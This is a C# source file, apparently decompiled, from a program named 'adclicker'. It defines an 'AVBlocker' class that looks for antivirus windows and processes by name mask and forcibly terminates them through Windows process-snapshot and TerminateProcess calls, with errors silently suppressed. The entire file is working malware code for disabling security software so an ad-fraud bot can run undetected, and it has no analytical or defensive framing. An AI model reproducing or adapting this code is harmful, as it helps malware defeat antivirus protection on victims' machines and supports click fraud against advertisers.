using System;
using Lexplorer;

namespace adclicker;

internal class AVBlocker
{
	private AVBlockInfo[] _blocks;

	public AVBlocker(AVBlockInfo[] blocks)
	{
		_blocks = new AVBlockInfo[blocks.Length];
		for (int i = 0; i < blocks.Length; i++)
		{
			ref AVBlockInfo reference = ref _blocks[i];
			reference = blocks[i];
		}
	}

	public bool Block()
	{
		try
		{
			AVBlockInfo[] blocks = _blocks;
			for (int i = 0; i < blocks.Length; i++)
			{
				AVBlockInfo aVBlockInfo = blocks[i];
				if (aVBlockInfo.windowCaptionMask != null)
				{
					if (Class25.FindWindow(null, aVBlockInfo.windowCaptionMask) != IntPtr.Zero && KillProcessByMask(aVBlockInfo.processNameMask))
					{
						return true;
					}
				}
				else if (KillProcessByMask(aVBlockInfo.processNameMask))
				{
					return true;
				}
			}
		}
		catch
		{
		}
		return false;
	}

	protected bool KillProcessByMask(string mask)
	{
		try
		{
			IntPtr intPtr = Class7.CreateToolhelp32Snapshot(SnapshotFlags.Process, 0u);
			PROCESSENTRY32 lppe = default(PROCESSENTRY32);
			lppe.dwSize = 296u;
			if (Class7.Process32First(intPtr, ref lppe))
			{
				while (Class7.Process32Next(intPtr, ref lppe))
				{
					if (lppe.szExeFile.ToLower().Contains(mask.ToLower()))
					{
						IntPtr intPtr2 = Class7.OpenProcess(ProcessAccessFlags.Terminate, bInheritHandle: false, (int)lppe.th32ProcessID);
						if (intPtr2 == IntPtr.Zero)
						{
							Class7.CloseHandle(intPtr);
							return false;
						}
						return Class7.TerminateProcess(intPtr2, 0u);
					}
				}
			}
			Class7.CloseHandle(intPtr);
		}
		catch
		{
		}
		return false;
	}
}
